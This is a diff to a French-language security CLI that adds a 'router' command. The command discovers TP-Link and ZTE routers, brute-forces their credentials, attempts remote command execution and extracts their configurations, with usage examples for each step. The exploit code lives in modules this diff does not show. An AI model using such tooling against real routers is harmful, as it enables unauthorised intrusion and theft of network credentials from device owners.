@@ -18,6 +18,12 @@ from phishing.detector import PhishingDetector
 from analysis.log_analyzer import LogAnalyzer
 from analysis.password_analyzer import PasswordAnalyzer
 from web.web_scanner import WebScanner
+from router.scanner import RouterScanner
+from router.tplink_exploit import TPLinkExploit
+from router.zte_exploit import ZTEExploit
+from router.credential_bruteforce import CredentialBruteforce
+from router.config_extractor import ConfigExtractor
+from router.exploit_db import ExploitDB
 
 
 def cmd_intrusion(args):
@@ -360,6 +366,141 @@ def cmd_web(args):
                 print(f"      URL: {v.get('url', 'N/A')}")
 
 
+def cmd_router(args):
+    print(banner())
+    info("Module Exploitation Routeurs (TP-Link / ZTE)")
+    print("-" * 60)
+
+    target_ip = args.target
+    if not target_ip:
+        target_ip = input("IP du routeur cible: ").strip()
+
+    if args.discover:
+        scanner = RouterScanner()
+        subnet = args.subnet or "192.168.1.0/24"
+        routers = scanner.quick_scan(subnet)
+        if routers:
+            print(f"\n{Fore.CYAN}Routeurs détectés:{Style.RESET_ALL}")
+            for r in routers:
+                brand_color = Fore.RED if r.get('brand') in ['TP-Link'] else (
+                    Fore.YELLOW if r.get('brand') == 'ZTE' else Fore.WHITE
+                )
+                print(f"  {r['ip']:>15}:{r['port']:<5} {brand_color}{r.get('brand', '?'):<10}{Style.RESET_ALL} "
+                      f"{r.get('model', '?'):<25} ports: {r.get('open_ports', [])}")
+        return
+
+    scanner = RouterScanner()
+    router_info = scanner.scan_single(target_ip)
+
+    if not router_info:
+        error(f"Aucun routeur détecté sur {target_ip}")
+        return
+
+    print(f"\n{Fore.CYAN}Routeur détecté:{Style.RESET_ALL}")
+    print(f"  IP: {router_info['ip']}")
+    print(f"  Port: {router_info['port']}")
+    print(f"  Marque: {router_info.get('brand', '?')}")
+    print(f"  Modèle: {router_info.get('model', '?')}")
+    print(f"  Firmware: {router_info.get('firmware', '?')}")
+    print(f"  Ports ouverts: {router_info.get('open_ports', [])}")
+
+    username = args.username or "admin"
+    password = args.password or "admin"
+
+    brand = router_info.get("brand", "").lower()
+
+    if args.bruteforce:
+        print(f"\n{Fore.CYAN}[Brute-force]{Style.RESET_ALL}")
+        bf = CredentialBruteforce(router_info)
+        if args.wordlist:
+            results = bf.dictionary_attack(username, args.wordlist, args.threads)
+        else:
+            results = bf.brute_force(threads=args.threads)
+
+        if results:
+            print(f"\n{Fore.GREEN}Identifiants trouvés:{Style.RESET_ALL}")
+            for r in results:
+                print(f"  {r['username']}:{r['password']} (via {r['method']})")
+        else:
+            warning("Aucun identifiant valide trouvé")
+
+    if brand == "tp-link":
+        print(f"\n{Fore.CYAN}[Exploits TP-Link]{Style.RESET_ALL}")
+        exploit = TPLinkExploit(router_info)
+        results = exploit.run_all(username, password)
+
+        if results:
+            for r in results:
+                sev_color = Fore.RED if r['severity'] == "CRITICAL" else (
+                    Fore.YELLOW if r['severity'] == "HIGH" else Fore.MAGENTA
+                )
+                print(f"  [{sev_color}{r['severity']}{Style.RESET_ALL}] {r['exploit']}")
+                print(f"         {r['description']}")
+
+        if args.exploit:
+            cmd = args.cmd or "id"
+            result = exploit.exploit_rce(cmd)
+            if result['success']:
+                print(f"\n{Fore.GREEN}[RCE] Résultat:{Style.RESET_ALL}\n{result['output']}")
+
+    elif brand == "zte":
+        print(f"\n{Fore.CYAN}[Exploits ZTE]{Style.RESET_ALL}")
+        exploit = ZTEExploit(router_info)
+        results = exploit.run_all(username, password)
+
+        if results:
+            for r in results:
+                sev_color = Fore.RED if r['severity'] == "CRITICAL" else (
+                    Fore.YELLOW if r['severity'] == "HIGH" else Fore.MAGENTA
+                )
+                print(f"  [{sev_color}{r['severity']}{Style.RESET_ALL}] {r['exploit']}")
+                print(f"         {r['description']}")
+
+        if args.exploit:
+            cmd = args.cmd or "id"
+            result = exploit.exploit_rce(cmd)
+            if result['success']:
+                print(f"\n{Fore.GREEN}[RCE] Résultat:{Style.RESET_ALL}\n{result['output']}")
+
+    else:
+        warning(f"Marque '{router_info.get('brand', '?')}' non reconnue, test générique...")
+        print(f"\n{Fore.CYAN}[Tests génériques]{Style.RESET_ALL}")
+
+        bf = CredentialBruteforce(router_info)
+        b_results = bf.brute_force(threads=args.threads)
+        if b_results:
+            for r in b_results:
+                print(f"  Identifiants: {r['username']}:{r['password']}")
+
+    if args.extract:
+        print(f"\n{Fore.CYAN}[Extraction de configuration]{Style.RESET_ALL}")
+        extractor = ConfigExtractor(router_info, username, password)
+        config = extractor.extract_all()
+        if config:
+            print(f"  Configuration extraite avec succès")
+            for section, data in config.items():
+                print(f"    {section}: {type(data).__name__} ({len(str(data))} octets)")
+            if args.output:
+                import json
+                with open(args.output, "w") as f:
+                    json.dump(config, f, indent=2)
+                success(f"  Configuration sauvegardée: {args.output}")
+
+    if args.list_exploits:
+        print(f"\n{Fore.CYAN}[Base d'exploits]{Style.RESET_ALL}")
+        db = ExploitDB()
+        if brand:
+            exploits = db.search(brand=brand)
+        else:
+            exploits = db.search()
+        summary = db.get_summary()
+        print(f"  Total exploits: {summary['total_exploits']}")
+        print(f"  CRITICAL: {summary['critical']}, HIGH: {summary['high']}, MEDIUM: {summary['medium']}")
+        for exp in exploits[:10]:
+            sev_color = Fore.RED if exp['severity'] == "CRITICAL" else Fore.YELLOW
+            print(f"  [{sev_color}{exp['cve']}{Style.RESET_ALL}] {exp['type']} - {exp['description'][:80]}")
+
+
 def cmd_all(args):
     print(banner())
     info("Mode TOUT-EN-UN - Analyse complète")
@@ -427,6 +568,11 @@ Exemples:
   cyber-ai password -p "monPassword123"  # Analyser mot de passe
   cyber-ai web https://example.com       # Scan web
   cyber-ai all example.com               # Analyse complète
+  cyber-ai router --discover             # Découvrir les routeurs
+  cyber-ai router 192.168.1.1            # Scanner un routeur
+  cyber-ai router 192.168.1.1 --exploit  # Exploiter un routeur TP-Link/ZTE
+  cyber-ai router 192.168.1.1 --bruteforce --threads 50  # Brute-force
+  cyber-ai router 192.168.1.1 --extract --output config.json  # Extraire config
         """
     )
 
@@ -462,6 +608,21 @@ Exemples:
     parser_web.add_argument("--sqli", action="store_true", help="Tester SQL Injection uniquement")
     parser_web.add_argument("--xss", action="store_true", help="Tester XSS uniquement")
 
+    parser_router = subparsers.add_parser("router", help="Exploitation de routeurs (TP-Link/ZTE)")
+    parser_router.add_argument("target", nargs="?", help="IP du routeur cible")
+    parser_router.add_argument("--discover", action="store_true", help="Découvrir les routeurs sur le réseau")
+    parser_router.add_argument("--subnet", default="192.168.1.0/24", help="Sous-réseau à scanner (défaut: 192.168.1.0/24)")
+    parser_router.add_argument("-u", "--username", help="Nom d'utilisateur (défaut: admin)")
+    parser_router.add_argument("-p", "--password", help="Mot de passe (défaut: admin)")
+    parser_router.add_argument("--bruteforce", action="store_true", help="Lancer le brute-force d'identifiants")
+    parser_router.add_argument("--wordlist", help="Wordlist pour le brute-force")
+    parser_router.add_argument("--threads", type=int, default=20, help="Nombre de threads (défaut: 20)")
+    parser_router.add_argument("--exploit", action="store_true", help="Tenter l'exploitation RCE")
+    parser_router.add_argument("--cmd", default="id", help="Commande à exécuter (défaut: id)")
+    parser_router.add_argument("--extract", action="store_true", help="Extraire la configuration")
+    parser_router.add_argument("--output", help="Fichier de sortie pour la configuration")
+    parser_router.add_argument("--list-exploits", action="store_true", help="Lister les exploits disponibles")
+
     parser_all = subparsers.add_parser("all", help="Analyse complète (tout-en-un)")
     parser_all.add_argument("target", nargs="?", help="Cible (IP ou domaine)")
 
@@ -483,6 +644,7 @@ Exemples:
         "logs": cmd_logs,
         "password": cmd_password,
         "web": cmd_web,
+        "router": cmd_router,
         "all": cmd_all,
     }
 
